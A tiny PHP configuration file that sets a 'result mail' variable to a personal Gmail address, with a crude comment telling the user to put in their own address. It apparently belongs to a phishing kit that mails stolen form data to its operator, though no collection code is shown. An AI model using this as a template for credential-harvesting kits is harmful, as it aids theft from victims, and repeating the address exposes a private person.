<?php

$rzlt_mail = "belhadjnourddine8@gmail.com"; // PUT UR FUCKING E-MAIL BRO

?>